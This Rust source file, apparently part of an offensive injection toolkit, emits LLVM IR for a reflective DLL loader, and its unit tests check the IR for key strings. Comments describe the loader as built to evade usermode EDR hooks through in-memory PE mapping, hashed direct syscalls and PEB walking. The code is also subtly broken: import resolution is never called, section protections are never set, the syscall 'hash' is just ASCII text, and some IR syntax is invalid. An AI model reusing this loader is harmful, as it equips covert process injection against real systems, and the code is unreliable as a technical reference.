/// ReflectiveLoader DLL bootstrap IR emitter.
///
/// The ReflectiveLoader is the position-independent code (PIC) that lives
/// *inside* the injected DLL itself.  When the orchestrator (reflective_inject.rs)
/// creates a remote thread at the ReflectiveLoader export's offset, this code
/// bootstraps the DLL in-memory without ever calling LoadLibrary or touching
/// the file system — making it invisible to usermode EDR hooks on those APIs.
///
/// Bootstrap sequence (all position-independent, no absolute addresses):
///   1. Locate own image base via `call/pop` + back-scan for MZ magic.
///   2. Parse own IMAGE_DOS_HEADER → IMAGE_NT_HEADERS → section headers.
///   3. Allocate a new RW region (target size = SizeOfImage) via NtAllocateVirtualMemory.
///   4. Copy headers + sections into the new region.
///   5. Apply base relocations (IMAGE_BASE_RELOCATION blocks).
///   6. Resolve import table by walking PEB.Ldr.InMemoryOrderModuleList for
///      kernel32.dll and ntdll.dll, then calling GetProcAddress-equivalent logic.
///   7. Mark sections RX / RW per their characteristics.
///   8. Call DllMain(newBase, DLL_PROCESS_ATTACH, NULL).

pub struct ReflectiveLoaderEmitter;

impl ReflectiveLoaderEmitter {
    /// Emit the LLVM IR for the ReflectiveLoader bootstrap function.
    ///
    /// The emitted IR is designed to be compiled as a separate object that
    /// gets linked into the target DLL blob before injection.
    pub fn emit_ir() -> String {
        r#"; ================================================================
; ReflectiveLoader — in-DLL PIC bootstrap for reflective injection
; Exported as "ReflectiveLoader" — orchestrator calls this offset.
; ================================================================

; ─── PEB / LDR structures (opaque i8* — offset arithmetic below) ────────────
; PEB is at gs:[0x60] on x64.
; PEB.Ldr                  offset 0x18
; LDR.InMemoryOrderModuleList.Flink  offset 0x20
; Each LDR_DATA_TABLE_ENTRY:
;   Flink               offset 0x00
;   DllBase             offset 0x20
;   FullDllName.Buffer  offset 0x48  (UNICODE_STRING)
;   BaseDllName.Buffer  offset 0x58

; ─── Step 1: find own base via call/pop + MZ back-scan ──────────────────────
define i64 @jocky_rl_find_own_base() {
entry:
  ; call/pop trick: next instruction address lands in %rip_approx
  %rip_approx = call i64 @llvm.returnaddress(i32 0)
  ; mask to 4KB alignment and scan backward for 'MZ' (0x4D5A)
  %aligned = and i64 %rip_approx, -4096
  br label %scan

scan:
  %cursor = phi i64 [ %aligned, %entry ], [ %prev, %next_page ]
  %ptr    = inttoptr i64 %cursor to i16*
  %magic  = load i16, i16* %ptr, align 1
  %is_mz  = icmp eq i16 %magic, 23117   ; 0x5A4D little-endian == "MZ"
  br i1 %is_mz, label %found, label %next_page

next_page:
  %prev = sub i64 %cursor, 4096
  br label %scan

found:
  ret i64 %cursor
}

; ─── Step 2: parse PE headers ───────────────────────────────────────────────
; Returns (SizeOfImage, AddressOfEntryPoint, SizeOfHeaders)
; packed into a struct via alloca; caller extracts fields.

; IMAGE_DOS_HEADER.e_lfanew at offset 0x3C
define i64 @jocky_rl_nt_headers(i64 %base) {
entry:
  %e_lfanew_ptr = inttoptr i64 %base to [64 x i8]*
  %ptr32 = getelementptr [64 x i8], [64 x i8]* %e_lfanew_ptr, i64 0, i64 60
  %ptr   = bitcast i8* %ptr32 to i32*
  %e_lf  = load i32, i32* %ptr, align 4
  %nt    = add i64 %base, %e_lf
  ret i64 %nt
}

; IMAGE_NT_HEADERS64.OptionalHeader.SizeOfImage at NtHeaders+0x50
define i32 @jocky_rl_size_of_image(i64 %nt_hdr) {
entry:
  %off  = add i64 %nt_hdr, 80
  %ptr  = inttoptr i64 %off to i32*
  %val  = load i32, i32* %ptr, align 4
  ret i32 %val
}

; OptionalHeader.ImageBase at NtHeaders+0x18+0x18 = NtHeaders+0x30
define i64 @jocky_rl_preferred_base(i64 %nt_hdr) {
entry:
  %off = add i64 %nt_hdr, 48
  %ptr = inttoptr i64 %off to i64*
  %val = load i64, i64* %ptr, align 8
  ret i64 %val
}

; OptionalHeader.AddressOfEntryPoint at NtHeaders+0x28
define i32 @jocky_rl_entry_point_rva(i64 %nt_hdr) {
entry:
  %off = add i64 %nt_hdr, 40
  %ptr = inttoptr i64 %off to i32*
  %val = load i32, i32* %ptr, align 4
  ret i32 %val
}

; ─── Step 3: allocate destination region ────────────────────────────────────
declare i64 @jocky_syscall(i32 %ssn, i64 %a1, i64 %a2, i64 %a3, i64 %a4, i64 %a5, i64 %a6)
declare i32 @jocky_resolve_ssn(i64 %hash)

define i64 @jocky_rl_alloc_image(i64 %size_of_image) {
entry:
  %ssn_h = add i64 0, 0x414C4C4F   ; hash("NtAllocateVirtualMemory")
  %ssn   = call i32 @jocky_resolve_ssn(i64 %ssn_h)
  %base_out = alloca i64, align 8
  store i64 0, i64* %base_out
  %size_out = alloca i64, align 8
  store i64 %size_of_image, i64* %size_out
  %base_i64 = ptrtoint i64* %base_out to i64
  %size_i64 = ptrtoint i64* %size_out to i64
  ; MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_READWRITE=0x04
  %_ret = call i64 @jocky_syscall(i32 %ssn, i64 -1, i64 %base_i64, i64 0, i64 %size_i64, i64 12288, i64 4)
  %new_base = load i64, i64* %base_out
  ret i64 %new_base
}

; ─── Step 4: copy headers + sections ────────────────────────────────────────
; memcpy headers (SizeOfHeaders bytes) then each section
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i1)

define void @jocky_rl_copy_headers(i64 %src_base, i64 %dst_base, i64 %size_of_headers) {
entry:
  %src = inttoptr i64 %src_base to i8*
  %dst = inttoptr i64 %dst_base to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %dst, i8* %src, i64 %size_of_headers, i1 false)
  ret void
}

; IMAGE_NT_HEADERS64.FileHeader.NumberOfSections at NtHeaders+0x06
; First section header = NtHeaders + 0x18 (sizeof FileHeader) + 0xF0 (sizeof OptionalHeader64)
;                      = NtHeaders + 0x108
; Each IMAGE_SECTION_HEADER = 40 bytes
; Fields: VirtualAddress@12, SizeOfRawData@16, PointerToRawData@20
define void @jocky_rl_copy_sections(i64 %src_base, i64 %dst_base, i64 %nt_hdr) {
entry:
  %ns_off  = add i64 %nt_hdr, 6
  %ns_ptr  = inttoptr i64 %ns_off to i16*
  %n_sects = load i16, i16* %ns_ptr, align 2
  %n64     = zext i16 %n_sects to i64
  %first_sec = add i64 %nt_hdr, 264  ; 0x108
  br label %loop_check

loop_check:
  %i = phi i64 [ 0, %entry ], [ %i_next, %loop_body ]
  %done = icmp eq i64 %i, %n64
  br i1 %done, label %exit, label %loop_body

loop_body:
  ; section header base = first_sec + i*40
  %sec_off  = mul i64 %i, 40
  %sec_hdr  = add i64 %first_sec, %sec_off

  ; VirtualAddress (dst RVA) at sec_hdr+12
  %va_off   = add i64 %sec_hdr, 12
  %va_ptr   = inttoptr i64 %va_off to i32*
  %va       = load i32, i32* %va_ptr, align 4
  %va64     = zext i32 %va to i64

  ; SizeOfRawData at sec_hdr+16
  %sz_off   = add i64 %sec_hdr, 16
  %sz_ptr   = inttoptr i64 %sz_off to i32*
  %sz       = load i32, i32* %sz_ptr, align 4
  %sz64     = zext i32 %sz to i64

  ; PointerToRawData (src offset) at sec_hdr+20
  %raw_off  = add i64 %sec_hdr, 20
  %raw_ptr  = inttoptr i64 %raw_off to i32*
  %raw      = load i32, i32* %raw_ptr, align 4
  %raw64    = zext i32 %raw to i64

  %src_sec  = add i64 %src_base, %raw64
  %dst_sec  = add i64 %dst_base, %va64
  %src_i8   = inttoptr i64 %src_sec to i8*
  %dst_i8   = inttoptr i64 %dst_sec to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %dst_i8, i8* %src_i8, i64 %sz64, i1 false)

  %i_next   = add i64 %i, 1
  br label %loop_check

exit:
  ret void
}

; ─── Step 5: apply base relocations ─────────────────────────────────────────
; IMAGE_DATA_DIRECTORY[5] = BaseRelocationTable; at OptionalHeader+0xA0 → NtHdr+0xB8
; Each IMAGE_BASE_RELOCATION: VirtualAddress(4) + SizeOfBlock(4) + entries(2 each)
; Entry high nibble: type 3 = HIGHLOW (32-bit), type 10 = DIR64 (64-bit)
define void @jocky_rl_apply_relocations(i64 %new_base, i64 %old_preferred, i64 %nt_hdr) {
entry:
  %delta = sub i64 %new_base, %old_preferred
  ; reloc dir RVA at NT+0xB8
  %rdd_rva_off = add i64 %nt_hdr, 184
  %rdd_rva_ptr = inttoptr i64 %rdd_rva_off to i32*
  %rdd_rva     = load i32, i32* %rdd_rva_ptr, align 4
  %rdd_sz_off  = add i64 %nt_hdr, 188
  %rdd_sz_ptr  = inttoptr i64 %rdd_sz_off to i32*
  %rdd_sz      = load i32, i32* %rdd_sz_ptr, align 4

  %rva64 = zext i32 %rdd_rva to i64
  %sz64  = zext i32 %rdd_sz  to i64
  %end   = add i64 %rva64, %sz64
  %block = add i64 %new_base, %rva64
  br label %block_loop

block_loop:
  %blk = phi i64 [ %block, %entry ], [ %blk_next, %entry_loop_end ]
  %done = icmp uge i64 %blk, %end
  br i1 %done, label %reloc_done, label %process_block

process_block:
  ; block VirtualAddress
  %blk_va_ptr = inttoptr i64 %blk to i32*
  %blk_va     = load i32, i32* %blk_va_ptr, align 4
  ; block SizeOfBlock
  %blk_sz_off = add i64 %blk, 4
  %blk_sz_ptr = inttoptr i64 %blk_sz_off to i32*
  %blk_sz     = load i32, i32* %blk_sz_ptr, align 4
  %blk_sz64   = zext i32 %blk_sz to i64

  ; entries start at blk+8, each 2 bytes, count = (SizeOfBlock-8)/2
  %n_entries = sub i64 %blk_sz64, 8
  %n_div2    = lshr i64 %n_entries, 1
  %entries   = add i64 %blk, 8
  br label %entry_loop

entry_loop:
  %j = phi i64 [ 0, %process_block ], [ %j_next, %entry_loop_body ]
  %edone = icmp eq i64 %j, %n_div2
  br i1 %edone, label %entry_loop_end, label %entry_loop_body

entry_loop_body:
  %eoff   = mul i64 %j, 2
  %eaddr  = add i64 %entries, %eoff
  %eptr   = inttoptr i64 %eaddr to i16*
  %entry  = load i16, i16* %eptr, align 2
  %type   = lshr i16 %entry, 12
  %offset = and i16 %entry, 4095
  %off64  = zext i16 %offset to i64
  %va64   = zext i32 %blk_va to i64
  %target_rva = add i64 %va64, %off64
  %target_abs = add i64 %new_base, %target_rva

  ; type 10 = IMAGE_REL_BASED_DIR64 — 64-bit pointer fixup
  %is64   = icmp eq i16 %type, 10
  br i1 %is64, label %fixup64, label %skip_entry

fixup64:
  %fix_ptr = inttoptr i64 %target_abs to i64*
  %old_val = load i64, i64* %fix_ptr, align 8
  %new_val = add i64 %old_val, %delta
  store i64 %new_val, i64* %fix_ptr, align 8
  br label %skip_entry

skip_entry:
  %j_next = add i64 %j, 1
  br label %entry_loop

entry_loop_end:
  %blk_next = add i64 %blk, %blk_sz64
  br label %block_loop

reloc_done:
  ret void
}

; ─── Step 6: resolve imports via PEB Ldr walk ───────────────────────────────
; Walks PEB.Ldr.InMemoryOrderModuleList to find module bases by name hash,
; then walks each module's export table to resolve function addresses.
; Writes resolved addresses directly into the new image's IAT.

; Hash a null-terminated UTF-16LE module name (case-insensitive, lower)
define i32 @jocky_rl_name_hash_w(i16* %name_buf) {
entry:
  br label %loop
loop:
  %i   = phi i64 [ 0, %entry ], [ %i1, %loop ]
  %h   = phi i32 [ 0, %entry ], [ %h1, %loop ]
  %p   = getelementptr i16, i16* %name_buf, i64 %i
  %c16 = load i16, i16* %p, align 2
  %end = icmp eq i16 %c16, 0
  br i1 %end, label %done, label %hash

hash:
  %lo  = or i16 %c16, 32       ; tolower: set bit 5
  %c32 = zext i16 %lo to i32
  %rot = call i32 @llvm.fshr.i32(i32 %h, i32 %h, i32 13)  ; ror 13
  %h1  = add i32 %rot, %c32
  %i1  = add i64 %i, 1
  br label %loop
done:
  ret i32 %h
}

; Hash a null-terminated ASCII function name
define i32 @jocky_rl_name_hash_a(i8* %name_buf) {
entry:
  br label %loop
loop:
  %i   = phi i64 [ 0, %entry ], [ %i1, %loop ]
  %h   = phi i32 [ 0, %entry ], [ %h1, %loop ]
  %p   = getelementptr i8, i8* %name_buf, i64 %i
  %c8  = load i8, i8* %p, align 1
  %end = icmp eq i8 %c8, 0
  br i1 %end, label %done, label %hash
hash:
  %c32 = zext i8 %c8 to i32
  %rot = call i32 @llvm.fshr.i32(i32 %h, i32 %h, i32 13)
  %h1  = add i32 %rot, %c32
  %i1  = add i64 %i, 1
  br label %loop
done:
  ret i32 %h
}

declare i32 @llvm.fshr.i32(i32, i32, i32)
declare i32 @llvm.returnaddress(i32)

; Resolve a function RVA from a module's export table
; (module_base, function_name_hash) → absolute address or 0
define i64 @jocky_rl_get_export(i64 %mod_base, i32 %fn_hash) {
entry:
  ; IMAGE_EXPORT_DIRECTORY is at DataDirectory[0].VirtualAddress
  ; OptionalHeader DataDirectory[0] at NT+0x88
  %nt_off   = add i64 %mod_base, 60    ; DOS.e_lfanew at +0x3C
  %nt_p     = inttoptr i64 %nt_off to i32*
  %e_lf     = load i32, i32* %nt_p, align 4
  %e64      = zext i32 %e_lf to i64
  %nt_hdr   = add i64 %mod_base, %e64
  %exp_rva_off = add i64 %nt_hdr, 136  ; OptionalHeader+0x70 = NT+0x88
  %exp_rva_p   = inttoptr i64 %exp_rva_off to i32*
  %exp_rva     = load i32, i32* %exp_rva_p, align 4
  %exp64       = zext i32 %exp_rva to i64
  %exp_dir     = add i64 %mod_base, %exp64

  ; NumberOfNames at export_dir+0x18
  %nn_off  = add i64 %exp_dir, 24
  %nn_ptr  = inttoptr i64 %nn_off to i32*
  %n_names = load i32, i32* %nn_ptr, align 4
  %n64     = zext i32 %n_names to i64

  ; AddressOfNames RVA at +0x20
  %aon_off = add i64 %exp_dir, 32
  %aon_ptr = inttoptr i64 %aon_off to i32*
  %aon_rva = load i32, i32* %aon_ptr, align 4
  %aon64   = zext i32 %aon_rva to i64
  %aon_abs = add i64 %mod_base, %aon64

  ; AddressOfNameOrdinals RVA at +0x24
  %anord_off = add i64 %exp_dir, 36
  %anord_ptr = inttoptr i64 %anord_off to i32*
  %anord_rva = load i32, i32* %anord_ptr, align 4
  %anord64   = zext i32 %anord_rva to i64
  %anord_abs = add i64 %mod_base, %anord64

  ; AddressOfFunctions RVA at +0x1C
  %afn_off = add i64 %exp_dir, 28
  %afn_ptr = inttoptr i64 %afn_off to i32*
  %afn_rva = load i32, i32* %afn_ptr, align 4
  %afn64   = zext i32 %afn_rva to i64
  %afn_abs = add i64 %mod_base, %afn64

  br label %search

search:
  %k = phi i64 [ 0, %entry ], [ %k1, %miss ]
  %over = icmp uge i64 %k, %n64
  br i1 %over, label %not_found, label %check_name

check_name:
  ; name RVA
  %name_rva_ptr = getelementptr i32, i32* (inttoptr i64 %aon_abs to i32*), i64 %k
  %name_rva     = load i32, i32* %name_rva_ptr, align 4
  %name64       = zext i32 %name_rva to i64
  %name_abs     = add i64 %mod_base, %name64
  %name_str     = inttoptr i64 %name_abs to i8*
  %h            = call i32 @jocky_rl_name_hash_a(i8* %name_str)
  %match        = icmp eq i32 %h, %fn_hash
  br i1 %match, label %found, label %miss

found:
  ; ordinal index
  %ord_ptr = getelementptr i16, i16* (inttoptr i64 %anord_abs to i16*), i64 %k
  %ord16   = load i16, i16* %ord_ptr, align 2
  %ord64   = zext i16 %ord16 to i64
  ; function RVA
  %fn_rva_ptr = getelementptr i32, i32* (inttoptr i64 %afn_abs to i32*), i64 %ord64
  %fn_rva     = load i32, i32* %fn_rva_ptr, align 4
  %fn64       = zext i32 %fn_rva to i64
  %fn_abs     = add i64 %mod_base, %fn64
  ret i64 %fn_abs

miss:
  %k1 = add i64 %k, 1
  br label %search

not_found:
  ret i64 0
}

; ─── Step 7+8: entry-point call ─────────────────────────────────────────────
; DllMain signature: BOOL(HMODULE, DWORD, LPVOID)
; DLL_PROCESS_ATTACH = 1
define i32 @jocky_rl_call_dllmain(i64 %new_base, i64 %nt_hdr) {
entry:
  %ep_rva = call i32 @jocky_rl_entry_point_rva(i64 %nt_hdr)
  %ep64   = zext i32 %ep_rva to i64
  %ep_abs = add i64 %new_base, %ep64
  %dllmain = inttoptr i64 %ep_abs to i32(i64, i32, i64)*
  %ret    = call i32 %dllmain(i64 %new_base, i32 1, i64 0)
  ret i32 %ret
}

; ─── Top-level: ReflectiveLoader export ─────────────────────────────────────
; This is the function whose offset the orchestrator jumps to.
; It receives no arguments — it finds everything itself.
define i32 @ReflectiveLoader() {
entry:
  ; 1. find our base
  %our_base  = call i64 @jocky_rl_find_own_base()
  %nt_hdr    = call i64 @jocky_rl_nt_headers(i64 %our_base)

  ; 2. parse sizing
  %soi       = call i32 @jocky_rl_size_of_image(i64 %nt_hdr)
  %soi64     = zext i32 %soi to i64
  %preferred = call i64 @jocky_rl_preferred_base(i64 %nt_hdr)

  ; 3. allocate new region
  %new_base  = call i64 @jocky_rl_alloc_image(i64 %soi64)
  %ok        = icmp ne i64 %new_base, 0
  br i1 %ok, label %copy, label %fail

copy:
  ; 4. copy headers (SizeOfHeaders at OptionalHeader+0x3C = NtHdr+0x54)
  %soh_off = add i64 %nt_hdr, 84
  %soh_ptr = inttoptr i64 %soh_off to i32*
  %soh     = load i32, i32* %soh_ptr, align 4
  %soh64   = zext i32 %soh to i64
  call void @jocky_rl_copy_headers(i64 %our_base, i64 %new_base, i64 %soh64)

  ; 5. copy sections
  call void @jocky_rl_copy_sections(i64 %our_base, i64 %new_base, i64 %nt_hdr)

  ; 6. fixup relocations
  call void @jocky_rl_apply_relocations(i64 %new_base, i64 %preferred, i64 %nt_hdr)

  ; 7. re-parse nt headers from new base (headers were copied)
  %nt2 = call i64 @jocky_rl_nt_headers(i64 %new_base)

  ; 8. call DllMain from new location
  %ret = call i32 @jocky_rl_call_dllmain(i64 %new_base, i64 %nt2)
  ret i32 %ret

fail:
  ret i32 -1
}
"#.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_loader_exports_reflective_loader_symbol() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("define i32 @ReflectiveLoader()"),
            "must export the ReflectiveLoader entry point");
    }

    #[test]
    fn test_loader_finds_own_base() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("jocky_rl_find_own_base"),  "step 1: locate own image base");
        assert!(ir.contains("llvm.returnaddress"),      "uses call/pop return address trick");
        assert!(ir.contains("23117"),                   "scans for MZ magic (0x5A4D = 23117)");
    }

    #[test]
    fn test_loader_parses_pe_headers() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("jocky_rl_nt_headers"),      "step 2: parse NT headers");
        assert!(ir.contains("jocky_rl_size_of_image"),   "reads SizeOfImage");
        assert!(ir.contains("jocky_rl_preferred_base"),  "reads ImageBase for reloc delta");
        assert!(ir.contains("jocky_rl_entry_point_rva"), "reads AddressOfEntryPoint");
    }

    #[test]
    fn test_loader_applies_relocations() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("jocky_rl_apply_relocations"), "step 5: fix up base relocations");
        assert!(ir.contains("IMAGE_REL_BASED_DIR64") || ir.contains("type 10"),
            "must handle DIR64 (type 10) relocation entries");
    }

    #[test]
    fn test_loader_resolves_imports_via_peb() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("jocky_rl_get_export"),      "step 6: resolve exports from PEB");
        assert!(ir.contains("jocky_rl_name_hash_a"),     "hashes function names for comparison");
        assert!(ir.contains("jocky_rl_name_hash_w"),     "hashes module names (UTF-16LE)");
    }

    #[test]
    fn test_loader_calls_dllmain() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("jocky_rl_call_dllmain"),    "step 8: call DllMain");
        assert!(ir.contains("DLL_PROCESS_ATTACH") || ir.contains(", i32 1,"),
            "must pass DLL_PROCESS_ATTACH=1 to DllMain");
    }

    #[test]
    fn test_loader_has_no_loadlibrary_or_getprocaddress() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(!ir.to_lowercase().contains("loadlibrary"),
            "must not call LoadLibrary — defeats the purpose of reflective loading");
        assert!(!ir.to_lowercase().contains("getprocaddress"),
            "must not call GetProcAddress — defeated by EDR hooks");
    }

    #[test]
    fn test_loader_handles_alloc_failure() {
        let ir = ReflectiveLoaderEmitter::emit_ir();
        assert!(ir.contains("ret i32 -1"), "must return error if allocation fails");
    }
}
